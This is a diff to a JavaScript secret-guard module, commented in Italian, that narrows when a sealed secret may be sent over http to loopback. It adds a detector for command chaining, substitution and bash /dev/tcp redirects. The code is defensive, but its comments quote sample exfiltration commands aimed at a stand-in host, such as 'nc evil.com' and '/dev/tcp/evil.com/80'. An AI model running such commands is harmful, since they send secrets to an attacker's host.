@@ -61,7 +61,7 @@ export function setSecret(name, value, { description = "", allowedSinks = [], re
 export function setAllowLocalHttp(name, allow = true) {
   const s = SEALED.get(name);
   if (!s) return { ok: false, reason: "secret does not exist" };
-  s.allowLocalHttp = allow !== false;
+  s.allowLocalHttp = allow === true; // solo true abilita (coerente con setSecret; no truthiness sorprese)
   return { ok: true, name, allowLocalHttp: s.allowLocalHttp };
 }
 
@@ -130,6 +130,24 @@ export function hasInsecureHttp(opText) {
 }
 
 /**
+ * L'operazione COMPONE più comandi / sostituzioni (≠ singola richiesta a un solo URL)? Usato SOLO dal fast-path
+ * `allowLocalHttp` (review-loop 2026-06-30, P0): una deny-shape come `https-only` perde contro la composizione
+ * (`curl http://localhost ; nc evil.com`, `1>/dev/tcp/evil.com/80`, `$(...)`), quindi il fast-path consente SOLO una
+ * shape PULITA (un comando, un URL) e qualunque segnale di composizione lo invalida → si ricade sul blocco normale.
+ * Segnali: separatori/chaining/background, pipe, sostituzioni `$()`/`<()`, bash net-redirect `/dev/tcp|udp`, newline
+ * (anche dal join multi-arg di injectIntoStrings → uno split-view tra argomenti). NB: `&` di una URL-query
+ * (`?a=1&b=2`) NON conta (richiede whitespace/boundary attorno) per non bloccare URL legittimi con parametri.
+ */
+export function hasCommandComposition(opText) {
+  const t = String(opText ?? "");
+  if (/[\n;`|]/.test(t)) return true;                        // newline · ; · backtick · pipe (incl. ||)
+  if (/&&/.test(t) || /(^|\s)&(\s|$)/.test(t)) return true;  // && · backgrounding & (non &param di URL)
+  if (/\$\(|<\(/.test(t)) return true;                       // $(...) · <(...)
+  if (/\/dev\/(tcp|udp)\b/i.test(t)) return true;            // bash network redirect (esfil senza nc)
+  return false;
+}
+
+/**
  * isLoopbackLiteral — `host` è un loopback LETTERALE (127.0.0.0/8, `localhost`, `::1`)? Usato dal fast-path
  * `allowLocalHttp`: http è consentito SOLO verso loopback, e SOLO su host LETTERALE (non hostname arbitrari) per non
  * dipendere dalla risoluzione DNS (anti DNS-rebinding). NB: `localhost` è incluso per ergonomia dev; un /etc/hosts
@@ -159,16 +177,27 @@ export function checkSink(name, opText, mode = "strict") {
   const hosts = extractHosts(opText);
   const fileExfil = hasFileOrPipeExfil(opText);
   const hostPinned = hasHostPinning(opText);
-  // FAST-PATH allowLocalHttp (utente msg 668): un secret LOCALE che ha fatto opt-in ESPLICITO può andare su http MA
-  // SOLO verso loopback LETTERALE. Condizioni TUTTE necessarie: (a) flag attivo; (b) c'è ≥1 host; (c) OGNI host è
-  // loopback letterale; (d) NIENTE scrittura-file; (e) NIENTE host-pinning. La (e) è CRITICA: `--resolve`/proxy/`Host:`
-  // potrebbero far connettere "localhost" a un IP ESTERNO → senza questo guard il fast-path sarebbe un bypass. Quando
-  // concesso, bypassa https-only E allowedSinks (loopback è intrinsecamente non-esfiltrante + opt-in dell'utente).
-  if (s.allowLocalHttp && hosts.length && !fileExfil && !hostPinned && hosts.every(isLoopbackLiteral)) {
+  // FAST-PATH allowLocalHttp (utente msg 668) — è una deroga RISTRETTA e CONSENSO-GATED, NON la tesi "loopback è
+  // sicuro" (review-loop 2026-06-30, H2/P0): un comando composto o un relay/redirect locale può ANCORA muovere il
+  // valore (= exfil-via-use, de-prioritizzata). Ciò che rende la deroga accettabile è il consenso ESPLICITO
+  // dell'utente (request_local_http/CLI), non la natura del loopback. Per non riaprire l'exfil-FACILE la concediamo
+  // SOLO a una shape PULITA — tutte necessarie: (a) opt-in attivo; (b) ≥1 host e (c) OGNI host loopback letterale;
+  // (d) niente scrittura-file; (e) niente host-pinning (CRITICO: `--resolve`/proxy rimapperebbero "localhost" su un IP
+  // esterno); (f) UN SOLO URL (countUrls su `://`, anti `2://evil.com` invisibile a extractHosts); (g) niente
+  // composizione di comandi (`;`/`&&`/`|`/`$()`/newline = un secondo canale d'uscita). Concesso → bypassa https-only
+  // E allowedSinks per QUEL solo comando-loopback (qualsiasi schema: anche https://localhost).
+  const urlCount = (String(opText).match(/:\/\//g) || []).length;
+  if (s.allowLocalHttp && hosts.length && hosts.every(isLoopbackLiteral)
+      && !fileExfil && !hostPinned && urlCount === 1 && !hasCommandComposition(opText)) {
     return { allowed: true };
   }
   // https-only: un sealed-secret NON transita su http:// in chiaro (vale in strict E warn: è igiene crittografica).
-  if (hasInsecureHttp(opText)) return { allowed: false, reason: `'${name}' cannot be sent over http:// in cleartext (use https; for a local secret enable allowLocalHttp + target loopback only)` };
+  if (hasInsecureHttp(opText)) {
+    const loopbackHint = hosts.length && hosts.every(isLoopbackLiteral)
+      ? " (loopback target: enable allowLocalHttp via request_local_http, and use a SINGLE clean command — no ';'/'|'/'&&')"
+      : " (use https)";
+    return { allowed: false, reason: `'${name}' cannot be sent over http:// in cleartext${loopbackHint}` };
+  }
 
   if (s.allowedSinks.length) {
     // allow-host fail-closed (vale anche in 'warn': l'allow-list è una scelta esplicita dell'utente)
@@ -181,10 +210,14 @@ export function checkSink(name, opText, mode = "strict") {
   }
 
   // secret SENZA allow-list dichiarata → deny-list conservativa
+  const allLoopback = hosts.length && hosts.every(isLoopbackLiteral);
   const reason = fileExfil
     ? `'${name}' without allowedSinks: file/pipe write blocked`
     : hosts.length
-      ? `'${name}' without allowedSinks: network send blocked (declare allowedSinks to use it toward a host)`
+      ? allLoopback
+        // host loopback ma flag OFF (es. https://localhost): due rimedi possibili → li nomino entrambi (anti-cerimonia M4)
+        ? `'${name}' without allowedSinks: blocked toward localhost. Either add the loopback host to allowedSinks, or (for http) enable allowLocalHttp via request_local_http.`
+        : `'${name}' without allowedSinks: network send blocked (declare allowedSinks to use it toward a host)`
       : null;
   if (reason) {
     if (mode === "warn") return { allowed: true, warn: reason };
@@ -327,4 +360,4 @@ export function clearSealed() {
   ingressCounter = 0;
 }
 
-export default { setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, loadFromEnv, clearSealed };
+export default { setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp, hasCommandComposition, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, loadFromEnv, clearSealed };
